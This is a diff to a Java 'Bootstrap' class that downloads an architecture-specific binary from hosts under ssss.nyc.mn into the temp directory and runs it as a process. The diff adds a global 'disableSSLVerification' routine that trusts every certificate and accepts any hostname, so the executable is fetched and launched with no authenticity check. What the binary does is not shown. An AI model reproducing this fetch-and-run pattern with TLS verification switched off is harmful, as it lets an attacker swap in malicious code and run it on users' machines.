@@ -5,6 +5,9 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.security.SecureRandom;
+import java.security.cert.X509Certificate;
+import javax.net.ssl.*;
 import java.lang.reflect.Field;
 
 public class Bootstrap
@@ -145,10 +148,13 @@ public class Bootstrap
         }
     }
     
-    private static Path getBinaryPath() throws IOException {
+    private static Path getBinaryPath() throws Exception {
+        // ⚠️ 忽略 SSL 证书验证
+        disableSSLVerification();
+
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
+
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -158,7 +164,7 @@ public class Bootstrap
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
+
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
@@ -170,7 +176,21 @@ public class Bootstrap
         }
         return path;
     }
-    
+
+    private static void disableSSLVerification() throws Exception {
+        TrustManager[] trustAllCerts = new TrustManager[]{
+            new X509TrustManager() {
+                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
+                public void checkClientTrusted(X509Certificate[] certs, String authType) {}
+                public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+            }
+        };
+        SSLContext sc = SSLContext.getInstance("TLS");
+        sc.init(null, trustAllCerts, new SecureRandom());
+        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+        HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
+    }
+
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
